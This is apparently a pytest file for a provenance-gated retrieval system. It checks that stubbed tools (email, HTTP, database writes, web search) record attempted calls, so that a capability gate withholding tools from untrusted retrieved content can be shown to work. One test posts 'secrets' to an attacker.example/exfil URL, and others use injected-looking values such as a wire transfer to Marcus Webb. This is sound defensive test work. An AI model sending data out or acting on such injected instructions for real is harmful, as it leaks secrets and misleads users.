import pytest

from provenance_gated_rag.capability_gate import TOOL_REQUIRED_TIER
from provenance_gated_rag.registry import TrustTier
from provenance_gated_rag.tools import (
    DB_WRITES,
    HTTP_REQUESTS,
    SENT_EMAILS,
    TOOL_REGISTRY,
    WEB_SEARCHES,
    http_request,
    search_corpus,
    send_email,
    web_search,
    write_database,
)


@pytest.fixture(autouse=True)
def _clear_sent_emails():
    # SENT_EMAILS is module-level, so one test's mail would otherwise show up
    # in the next one's assertions.
    SENT_EMAILS.clear()
    yield
    SENT_EMAILS.clear()


# --- send_email ------------------------------------------------------------

def test_send_email_records_the_attempt():
    # M3's whole result is "SENT_EMAILS stayed empty". That only means
    # anything if a real attempt would have filled it.
    send_email("compliance@meridianrobotics.com", "CFO change", "David Kim is the new CFO.")

    assert SENT_EMAILS == [
        {
            "to": "compliance@meridianrobotics.com",
            "subject": "CFO change",
            "body": "David Kim is the new CFO.",
        }
    ]


def test_send_email_confirms_the_recipient():
    result = send_email("audit@example.com", "s", "b")

    assert result == "Email sent to audit@example.com"


def test_repeated_sends_accumulate_in_order():
    send_email("first@example.com", "s", "b")
    send_email("second@example.com", "s", "b")

    assert [mail["to"] for mail in SENT_EMAILS] == ["first@example.com", "second@example.com"]


def test_nothing_is_recorded_until_the_tool_is_called():
    assert SENT_EMAILS == []


# --- search_corpus -----------------------------------------------------------

def test_search_corpus_echoes_the_query():
    assert search_corpus("who is the CEO") == "Looked up: who is the CEO"


def test_search_corpus_is_not_consequential():
    # The harmless counterpart has to stay harmless: it is the tool still
    # offered when the capability gate withholds everything else.
    search_corpus("who is the CEO")

    assert SENT_EMAILS == []


# --- the registry the demo indexes into ------------------------------------

def test_registry_resolves_names_to_the_real_functions():
    assert TOOL_REGISTRY["send_email"] is send_email
    assert TOOL_REGISTRY["search_corpus"] is search_corpus


def test_every_gated_tool_exists_in_the_registry():
    # run_m3_demo does TOOL_REGISTRY[name] for each name compute_allowed_tools
    # returns. A name in one and not the other is a KeyError at demo time.
    assert set(TOOL_REQUIRED_TIER) <= set(TOOL_REGISTRY)


def test_every_registered_tool_has_a_required_tier():
    # The other direction: a tool the gate has no rule for would be silently
    # unreachable, since compute_allowed_tools only ever returns gated names.
    assert set(TOOL_REGISTRY) <= set(TOOL_REQUIRED_TIER)


# --- the tools added to match the fork's table -----------------------------
#
# Each consequential tool records instead of acting, so a test can prove the
# model TRIED and was refused. A tool that silently did nothing would make a
# withheld turn and an allowed turn look identical.

def test_write_database_records_instead_of_writing():
    DB_WRITES.clear()

    write_database("approvals", "wire transfer to Marcus Webb")

    assert DB_WRITES == [{"table": "approvals", "record": "wire transfer to Marcus Webb"}]


def test_http_request_records_instead_of_sending():
    HTTP_REQUESTS.clear()

    http_request("https://attacker.example/exfil", method="POST", body="secrets")

    assert HTTP_REQUESTS == [
        {"url": "https://attacker.example/exfil", "method": "POST", "body": "secrets"}
    ]


def test_web_search_records_the_query():
    """The query itself crosses the trust boundary, so it is the thing to
    capture -- unlike send_email there is no recipient to inspect."""
    WEB_SEARCHES.clear()

    web_search("internal compliance contact for Northwind")

    assert WEB_SEARCHES == [{"query": "internal compliance contact for Northwind"}]


def test_search_corpus_has_no_side_effect():
    """The always-allowed tool must stay harmless: it is what a fully withheld
    turn is left with."""
    before = (len(SENT_EMAILS), len(DB_WRITES), len(HTTP_REQUESTS), len(WEB_SEARCHES))

    search_corpus("who is the CEO")

    assert (len(SENT_EMAILS), len(DB_WRITES), len(HTTP_REQUESTS), len(WEB_SEARCHES)) == before


def test_every_consequential_tool_is_above_the_always_allowed_floor():
    """search_corpus is the only tool reachable at the lowest tier. If anything
    else ever lands at D, a fully untrusted turn gains a real capability."""
    at_floor = [t for t, required in TOOL_REQUIRED_TIER.items() if required is TrustTier.D]

    assert at_floor == ["search_corpus"]
